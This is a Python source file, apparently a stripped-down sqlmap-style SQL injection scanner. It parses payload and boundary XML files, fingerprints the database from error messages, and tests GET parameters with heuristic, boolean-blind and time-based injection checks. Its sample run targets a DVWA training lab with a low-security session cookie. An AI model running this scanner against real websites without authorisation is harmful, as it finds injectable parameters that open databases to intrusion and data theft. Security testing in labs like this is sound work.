#!/usr/bin/env python
# -*- coding: utf-8 -*-
# DateTime    : 2019-07-17 21:51:57
# Author  : dongchuan
# Version : v1.0
# Desc     : 
import os
import re
import copy
import urlparse
from lib.config import conf
from lib.config import kb
from lib.data import AttribDict
from xml.etree import ElementTree as et
from xml.sax.handler import ContentHandler
from lib.utils.Agent import agent
from lib.utils.common import randomStr
from lib.utils.common import cleanupVals
from lib.utils.common import parseXmlFile
from lib.request.queryPage import proxyqueryPage
from lib.utils.common import readCachedFileContent
from lib.utils.common import urlencode, getUnicode,setCookie
from lib.utils.common import paramToDict_t, urldecode, Backend
from lib.utils.common import extractTextTagContent, InjectionDict, intersect
from lib.utils.checks import checkDynParam, checkDynParam_t, HTTPCheck, checkTimeBasedCompare
from lib.utils.enums import PLACE, SORT_ORDER, CUSTOM_INJECTION_MARK_CHAR, DEFAULT_GET_POST_DELIMITER
from lib.utils.enums import URI_QUESTION_MARKER, HEURISTIC_CHECK_ALPHABET, TECHNIQUE, WHERE, PAYLOAD, SLEEP_TIME_MARKER




class HTMLHandler(ContentHandler):
    """
    This class defines methods to parse the input HTML page to
    fingerprint the back-end database management system
    """

    def __init__(self, page):
        ContentHandler.__init__(self)

        self._dbms = None
        self._page = page
        self.dbms = None

    def _markAsErrorPage(self):
        conf.ErrorPage = self._page

    def startElement(self, name, attrs):
        if name == "dbms":
            self._dbms = attrs.get("value")

        elif name == "error":
            if re.search(attrs.get("regexp"), self._page, re.I):
                self.dbms = self._dbms
                kb.dbms = self.dbms
                self._markAsErrorPage()

def parseXmlNode(node):
    for element in node.getiterator('boundary'):
        boundary = AttribDict()

        for child in element.getchildren():
            if child.text:
                values = cleanupVals(child.text, child.tag)
                boundary[child.tag] = values
            else:
                boundary[child.tag] = None

        conf.boundaries.append(boundary)

    for element in node.getiterator('test'):
        test = AttribDict()

        for child in element.getchildren():
            if child.text and child.text.strip():
                values = cleanupVals(child.text, child.tag)
                test[child.tag] = values
            else:
                if len(child.getchildren()) == 0:
                    test[child.tag] = None
                    continue
                else:
                    test[child.tag] = AttribDict()

                    for gchild in child.getchildren():
                        if gchild.tag in test[child.tag]:
                            prevtext = test[child.tag][gchild.tag]
                            test[child.tag][gchild.tag] = [prevtext, gchild.text]
                        else:
                            test[child.tag][gchild.tag] = gchild.text
        conf.tests.append(test)


def getSortedInjectionTests():
    """
    Returns prioritized test list by eventually detected DBMS from error
    messages
    """
    retVal = copy.deepcopy(conf.tests)

    def priorityFunction(test):
        retVal = SORT_ORDER.FIRST

        if test.stype == TECHNIQUE.UNION:
            retVal = SORT_ORDER.LAST

        elif 'details' in test and 'dbms' in test.details:
            #print type(test)
            #if intersect(test.details.dbms, Backend.getIdentifiedDbms()):
            if test.details.dbms == kb.dbms:
                retVal = SORT_ORDER.SECOND
            else:
                retVal = SORT_ORDER.THIRD

        return retVal

    if kb.dbms:
        retVal = sorted(retVal, key=priorityFunction)

    return retVal

def parseTargetUrl(url):
    parameters = {}

    parseTargetUrl = url

    if not re.search("^http[s]*://", url, re.I) and  not re.search("^ws[s]*://", url, re.I):
        if ":443/" in url:
            url = "https://" + url
        else:
            url = "http://" + url
    try:
        urlSplit = urlparse.urlsplit(url)
    except ValueError, ex:
        print ex
    hostnamePort = urlSplit.netloc.split(":") if not re.search("\[.+\]", urlSplit.netloc) else filter(None, (re.search("\[.+\]", urlSplit.netloc).group(0), re.search("\](:(?P<port>\d+))?", urlSplit.netloc).group("port")))
    scheme = urlSplit.scheme.strip().lower()
    path = urlSplit.path.strip()
    hostname = hostnamePort[0].strip()

    ipv6 = hostname != hostname.strip("[]")
    hostname = hostname.strip("[]").replace(CUSTOM_INJECTION_MARK_CHAR, "")

    if len(hostnamePort) == 2:
        try:
            port = int(hostnamePort[1])
        except:
            errMsg = "invalid target URL"
            print errMsg
    elif scheme == "https":
        port = 443
    else:
        port = 80
    if urlSplit.query:
        conf.parameters[PLACE.GET] = urldecode(urlSplit.query) if urlSplit.query and urlencode(DEFAULT_GET_POST_DELIMITER, None) not in urlSplit.query else urlSplit.query

    uri = getUnicode("%s://%s:%d%s" % (scheme, ("[%s]" % hostname) if ipv6 else hostname, port, path))
    conf.url = uri.replace(URI_QUESTION_MARKER, '?')


def Init():
    readCachedFileContent(conf.errorsXML)
    for payloadFile in os.listdir(conf.payloadPath):
        payloadFilePath = os.path.join(conf.payloadPath, payloadFile)
        doc = et.parse(payloadFilePath)
        root = doc.getroot()
        parseXmlNode(root)
    
    boundaries_doc = et.parse(conf.boundariesXML)
    boundaries_root = boundaries_doc.getroot()
    parseXmlNode(boundaries_root)


def heuristicCheckSqlInjection(place, parameter, paramDict, parameters):
    origValue = paramDict[place][parameter]

    randStr = ""
    while '\'' not in randStr:
        randStr = randomStr(length=10, alphabet=HEURISTIC_CHECK_ALPHABET)

    payload = agent.payload_t(paramDict, parameters, place, parameter, newValue=randStr)
    #payload = agent.payload(place, key, addValue=randStr)
    if(payload):
        url = "%s?%s" % (conf.url, payload)
    response = proxyqueryPage(url)
    page = response.getdata()

    handler = HTMLHandler(page)

    parseXmlFile(conf.errorsXML, handler)

        
    if conf.ErrorPage:
        return True
    else:
        return False


def checkSqlInjection(place, parameter, value, paramDict, parameters, url_test):

    
    tests_check = getSortedInjectionTests()
    seenPayload = set()
    extendTests = kb.dbms
    reduceTests = kb.dbms

    while conf.tests:
        injection = InjectionDict()
        test = conf.tests.pop(0)
        title = test.title
        clause = test.clause
        stype = test.stype
        # print title

        injection.dbms = kb.dbms

        if stype == PAYLOAD.TECHNIQUE.UNION:
            if "[CHAR]" in title:
                continue

            elif "[RANDNUM]" in title or "(NULL)" in title:
                    title = title.replace("[RANDNUM]", "random number")

            if test.request.columns == "[COLSTART]-[COLSTOP]":
                continue

            match = re.search(r"(\d+)-(\d+)", test.request.columns)
            if injection.data and match:
                lower, upper = int(match.group(1)), int(match.group(2))
                for _ in (lower, upper):
                    if _ > 1:
                        unionExtended = True
                        test.request.columns = re.sub(r"\b%d\b" % _, str(2 * _), test.request.columns)
                        title = re.sub(r"\b%d\b" % _, str(2 * _), title)
                        test.title = re.sub(r"\b%d\b" % _, str(2 * _), test.title)


        if injection.data and stype in injection.data:
            continue


        # Parse DBMS-specific payloads' details
        if "details" in test and "dbms" in test.details:
            payloadDbms = test.details.dbms
        else:
            payloadDbms = None


        if payloadDbms is not None:

            if reduceTests and not intersect(payloadDbms, reduceTests, True):
                continue


        comment = agent.getComment(test.request) if len(conf.boundaries) > 1 else None
        fstPayload = agent.cleanupPayload(test.request.payload, origValue=value)

        if value.isdigit():
            conf.boundaries = sorted(copy.deepcopy(conf.boundaries), key=lambda x: any(_ in (x.prefix or "") or _ in (x.suffix or "") for _ in ('"', '\'')))

        for boundary in conf.boundaries:
            injectable = False

            if boundary.level > 1:
                continue

            clauseMatch = False

            for clauseTest in test.clause:
                if clauseTest in boundary.clause:
                    clauseMatch = True
                    break

            if test.clause != [0] and boundary.clause != [0] and not clauseMatch:
                continue

            whereMatch = False

            for where in test.where:
                if where in boundary.where:
                    whereMatch = True
                    break

            if not whereMatch:
                continue

                # Parse boundary's <prefix>, <suffix> and <ptype>
            prefix = boundary.prefix if boundary.prefix else ""
            suffix = boundary.suffix if boundary.suffix else ""
            ptype = boundary.ptype


            condBound = (injection.prefix is not None and injection.suffix is not None)
            condBound &= (injection.prefix != prefix or injection.suffix != suffix)
            condType = injection.ptype is not None and injection.ptype != ptype


            if stype != PAYLOAD.TECHNIQUE.QUERY and (condBound or condType):
                    continue

            for where in test.where:
                templatePayload = None
                vector = None

                # Threat the parameter original value according to the
                # test's <where> tag
                if where == WHERE.ORIGINAL:
                    origValue = value

                    templatePayload = None

                if fstPayload:
                    boundPayload = agent.prefixQuery(fstPayload, prefix, where, clause)
                    boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                    reqPayload = agent.payload_t(paramDict, parameters, place, parameter, newValue=boundPayload, where=where)
                    if reqPayload:
                        if reqPayload in seenPayload:
                            continue
                        else:
                            seenPayload.add(reqPayload)
                else:
                    reqPayload = None

                for method, check in test.response.items():
                    check = agent.cleanupPayload(check, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) else None)
                    # In case of boolean-based blind SQL injection
                    if method == PAYLOAD.METHOD.COMPARISON:
                        def genCmpPayload():
                            sndPayload = agent.cleanupPayload(test.response.comparison, origValue=value if place not in (PLACE.URI, PLACE.CUSTOM_POST, PLACE.CUSTOM_HEADER) else None)

                            # Forge response payload by prepending with
                            # boundary's prefix and appending the
                            # boundary's
                            # suffix to the test's ' <payload><comment> '
                            # string
                            boundPayload = agent.prefixQuery(sndPayload, prefix, where, clause)
                            boundPayload = agent.suffixQuery(boundPayload, comment, suffix, where)
                            cmpPayload = agent.payload_t(paramDict, parameters, place, parameter, newValue=boundPayload, where=where)

                            return cmpPayload
                        
                        if(genCmpPayload()):
                            url = "%s?%s" % (conf.url, genCmpPayload())
                        falseResponse = proxyqueryPage(url)
                        falsePage = falseResponse.getdata()

                        if(reqPayload):
                            url = "%s?%s" % (conf.url, reqPayload)
                        trueResponse = proxyqueryPage(url)
                        truePage = trueResponse.getdata()
                        trueResult = url_test.comparison(truePage)

                        if trueResult and not(truePage == falsePage):
                            if(genCmpPayload()):
                                url = "%s?%s" % (conf.url, genCmpPayload())
                            falseResponse = proxyqueryPage(url)
                            falsePage = falseResponse.getdata()
                            falseResult = url_test.comparison(falsePage)
                            if not falseResult:
                                injectable = True

                        if not injectable:
                            trueSet = set(extractTextTagContent(truePage))
                            falseSet = set(extractTextTagContent(falsePage))
                            candidates = filter(None, (_.strip() if _.strip() in (url_test.firstPage or "") and _.strip() not in falsePage and _.strip() else None for _ in (trueSet - falseSet)))


                            if candidates:
                                injectable = True

                    # In case of time-based blind or stacked queries
                    # SQL injections
                    elif method == PAYLOAD.METHOD.TIME:
                        # Perform the test's request
                        trueResult = checkTimeBasedCompare(reqPayload, conf.url)
                        # trueResult = True
                        if trueResult:
                            if SLEEP_TIME_MARKER in reqPayload:
                                falseResult = checkTimeBasedCompare(reqPayload.replace(SLEEP_TIME_MARKER, "0"), conf.url)
                                if falseResult:
                                    continue
                            # Confirm test's results
                            trueResult = checkTimeBasedCompare(reqPayload, conf.url)

                            if trueResult:
                                # infoMsg = "%sparameter '%s' appears to be '%s' injectable " % ("%s " % paramType if paramType != parameter else "", parameter, title)
                                # print infoMsg

                                injectable = True
                    elif method == PAYLOAD.METHOD.UNION:
                        pass


                if injectable is True:
                    if injection.place is None or injection.parameter is None:
                        if place in (PLACE.USER_AGENT, PLACE.REFERER, PLACE.HOST):
                                injection.parameter = place
                        else:
                                injection.parameter = parameter

                        injection.place = place
                        injection.ptype = ptype
                        injection.prefix = prefix
                        injection.suffix = suffix
                        injection.clause = clause


                        if hasattr(test, "details"):
                            for dKey, dValue in test.details.items():
                                if dKey == "dbms":
                                    injection.dbms = dValue

                                elif dKey == "dbms_version" and injection.dbms_version is None:
                                    injection.dbms_version = Backend.setVersion(dValue)

                                # elif dKey == "os" and injection.os is None:
                                #     injection.os = Backend.setOs(dValue)


                        if vector is None and "vector" in test and test.vector is not None:
                            vector = test.vector

                        injection.data[stype] = AttribDict()
                        injection.data[stype].title = title
                        injection.data[stype].payload = reqPayload
                        injection.data[stype].where = where
                        injection.data[stype].vector = vector
                        injection.data[stype].comment = comment
                        injection.data[stype].templatePayload = templatePayload

                        break


            if injectable is True:
                # break
                print injectable,injection
                # break

def start(url):
    paramDict = {}
    #检测网页稳定性
    conf.originUrl = url
    httpTest = HTTPCheck(url)
    if not httpTest.checkConnection():
        print "target URL content is stable"
        return
    #解析所有参数以及GET请求方式
    parseTargetUrl(url)

    pDict = paramToDict_t(PLACE.GET, conf.parameters[PLACE.GET])
    if pDict: 
        paramDict[PLACE.GET] = pDict
    
    #尝试所有GET参数是否是动态参数
    for place in conf.parameters.keys():
         for parameter, value in pDict.items():
             paramCheck = checkDynParam_t(place, httpTest, conf.url, paramDict, conf.parameters, parameter, value)
             # print 'Parameter key={0}, value={1}, check={2}'.format(parameter,value,check)
             if not paramCheck:
                 print "%s parameter '%s' does not appear to be dynamic" % (place,parameter)
             else:
                 print "%s parameter '%s' appears to be dynamic" % (place,parameter)
                 checkhh = heuristicCheckSqlInjection(place, parameter, paramDict, conf.parameters)
                 print checkhh
                 injection = checkSqlInjection(place, parameter, value, paramDict, conf.parameters, httpTest)
                 print injection


if __name__ == '__main__':
    Init()
    # start("http://localhost/test.php?id=1")
    setCookie("PHPSESSID=0cac79e9e449cd52de688c5ef9f8d816; security=low")
    start("http://dvwa.suicao.com/vulnerabilities/sqli/?id=1&Submit=Submit#")
    # print kb